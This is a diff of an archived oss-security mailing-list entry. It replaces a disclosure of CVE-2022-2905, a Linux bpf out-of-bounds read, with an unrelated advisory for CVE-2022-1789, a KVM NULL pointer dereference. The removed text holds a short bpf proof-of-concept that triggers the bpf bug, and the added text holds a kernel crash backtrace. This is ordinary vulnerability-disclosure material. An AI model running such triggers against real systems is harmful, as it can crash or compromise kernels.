@@ -1,71 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/26/3
-Message-ID: <CABcoxUZd4kYgG6A=5U4PAA72Y84XiWaM=Kp2Pfu4vbOMU-BigA@mail.gmail.com>
-Date: Sat, 27 Aug 2022 00:23:03 +0800
-From: Hsin-Wei Hung <hsinweih@....edu>
-To: oss-security@...ts.openwall.com
-Subject: Re: Linux kernel slab-out-of-bound read in bpf
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/05/25/2
+Message-ID: <6ee681a0.313bf.180fb0606b8.Coremail.kangel@zju.edu.cn>
+Date: Wed, 25 May 2022 19:41:57 +0800 (GMT+08:00)
+From: kangel <kangel@....edu.cn>
+To: oss-security@...ts.openwall.com, solar@...nwall.com
+Cc: secalert@...hat.com, pbonzini@...hat.com, seanjc@...gle.com,  vkuznets@...hat.com, wanpengli@...cent.com, jmattson@...gle.com,  joro@...tes.org, tglx@...utronix.de, mingo@...hat.com, bp@...en8.de,  dave.hansen@...ux.intel.com, x86@...nel.org, hpa@...or.com,  pgn@....edu.cn, qiuhao@...ec.org
+Subject: CVE-2022-1789: Linux Kernel: x86/kvm: NULL pointer dereference in kvm_mmu_invpcid_gva
 Content-Type: text/plain; charset=utf-8
 
-CVE-2022-2905 has been assigned to this issue.
+------------[ Description ]------------    With shadow paging enabled, the INVPCID instruction results in a call to kvm_mmu_invpcid_gva.  If INVPCID is executed with CR0.PG=0, the invlpg callback is not set and the result is a NULL pointer dereference.     This bug was disclosed on May 20 and assigned CVE-2022-1789. ------------[ Credits ]------------Yongkang Jia (Zhejiang University)Gaoning Pan (Zhejiang University)Qiuhao Li (Harbin Institute of Technology)------------[ Backtrace ]------------BUG: kernel NULL pointer dereference, address: 0000000000000000
+#PF: supervisor instruction fetch in kernel mode
+#PF: error_code(0x0010) - not-present page
+PGD 9112067 P4D 9112067 PUD 1f11067 PMD 0 
+Oops: 0010 [#1] PREEMPT SMP KASAN NOPTI
+CPU: 0 PID: 490 Comm: syz-executor159 Not tainted 5.17.0-rc8 #21
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014RIP: 0010:0x0
+Code: Unable to access opcode bytes at RIP 0xffffffffffffffd6.
+RSP: 0018:ffff88800a747810 EFLAGS: 00010246
+RAX: 0000000000000000 RBX: 0003000008280000 RCX: ffffffff9032ac99
+RDX: 1ffff1100189400d RSI: 0000000000000000 RDI: ffff88800c4a0000
+RBP: ffff88800c4a0088 R08: 0000000000000000 R09: ffff88800a1c41a7
+R10: ffffed1001438834 R11: 0000000000000001 R12: ffff88800c4a0072
+R13: ffffffff932296a0 R14: ffff88800c4a0020 R15: ffff88800c4a0000
+FS:  00007f95fcd82700(0000) GS:ffff88806ce00000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: ffffffffffffffd6 CR3: 0000000007c1a003 CR4: 0000000000772ef0
+DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+PKRU: 55555554
+Call Trace:
+ <TASK>
+ x86_emulate_insn+0xe41/0x3480 arch/x86/kvm/emulate.c:5469
+ x86_emulate_instruction+0x972/0x1400 arch/x86/kvm/x86.c:8375
+ kvm_mmu_page_fault+0x48f/0x1b80 arch/x86/kvm/mmu/mmu.c:5359
+ handle_ept_violation+0x24e/0x660 arch/x86/kvm/vmx/vmx.c:5429
+ __vmx_handle_exit arch/x86/kvm/vmx/vmx.c:6171 [inline]
+ vmx_handle_exit+0x5e7/0x1ab0 arch/x86/kvm/vmx/vmx.c:6188
+ vcpu_enter_guest+0x1adb/0x3af0 arch/x86/kvm/x86.c:10178
+ vcpu_run arch/x86/kvm/x86.c:10261 [inline]
+ kvm_arch_vcpu_ioctl_run+0x41e/0x17c0 arch/x86/kvm/x86.c:10471
+ kvm_vcpu_ioctl+0x4d2/0xc60 arch/x86/kvm/../../../virt/kvm/kvm_main.c:3908
+ vfs_ioctl fs/ioctl.c:51 [inline]
+ __do_sys_ioctl fs/ioctl.c:874 [inline]
+ __se_sys_ioctl fs/ioctl.c:860 [inline]
+ __x64_sys_ioctl+0x16d/0x1d0 fs/ioctl.c:860
+ do_syscall_x64 arch/x86/entry/common.c:50 [inline]
+ do_syscall_64+0x38/0x90 arch/x86/entry/common.c:80
+ entry_SYSCALL_64_after_hwframe+0x44/0xae------------[Patch ]------------The patch has been merged into the Linux kernel stable tree and it can be found here:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9f46c187e2e680ecd9de7983e4d081c3391acc76C repro is attached.Best regards.    Yongkang Jia
 
-Thanks,
-Hsin-Wei
+Content of type "text/html" skipped
 
-On Fri, Aug 26, 2022 at 7:07 AM Hsin-Wei Hung <hsinweih@....edu> wrote:
-
-> Hi,
->
-> We found an issue in the bpf subsystem of the Linux kernel that can cause
-> a slab-out-of-bound read. A bpf program calling bpf_tail_call with an index
-> larger than the max_entries can potentially pass the verifier. After that,
-> it will cause an out-of-bound access in the x86 JIT compiler. The root
-> cause is that tnum_range over-approximates the range of concrete values.
->
-> Affected kernel starts from v5.5 since commit, d2e4c1e6c294 (“bpf:
-> Constant map key tracking for prog array pokes”)
->
-> It has been fixed in commit, a657182a5c51 ("bpf: Don't use tnum_range on
-> array range checking for poke descriptors") in bpf/bpf.git.
->
-> The following code is a bpf PoC that can trigger the bug.
->
-> #include "/usr/local/include/vmlinux.h"
-> #include "/usr/include/bpf/bpf_helpers.h"
->
-> #define __uint(name, val) int (*name)[val]
-> #define __type(name, val) typeof(val) *name
-> #define __array(name, val) typeof(val) *name[]
->
-> #define SEC(name) \
->         _Pragma("GCC diagnostic push")                                  \
->         _Pragma("GCC diagnostic ignored \"-Wignored-attributes\"")      \
->         __attribute__((section(name), used))                            \
->         _Pragma("GCC diagnostic pop")
->
-> #define DEFINE_BPF_MAP(the_map, TypeOfMap, MapFlags, TypeOfKey,
-> TypeOfValue, MaxEntries) \
->         struct {                                                        \
->             __uint(type, TypeOfMap);                                    \
->             __uint(map_flags, (MapFlags));                              \
->             __uint(max_entries, (MaxEntries));                          \
->             __type(key, TypeOfKey);                                     \
->             __type(value, TypeOfValue);                                 \
->         } the_map SEC(".maps");
->
-> DEFINE_BPF_MAP(map_0, BPF_MAP_TYPE_PROG_ARRAY, 0, uint32_t, uint32_t, 36);
-> SEC("cgroup/sock_create")
-> int func(struct bpf_sock *ctx) {
->         int64_t v0 = 49;
->         bpf_tail_call(ctx, &map_0, v0);
->         return 0;
-> }
-> char _license[] SEC("license") = "GPL";
->
->
-> Thanks,
-> Hsin-Wei
->
->
->
-
+View attachment "poc.c" of type "text/plain" (10152 bytes)
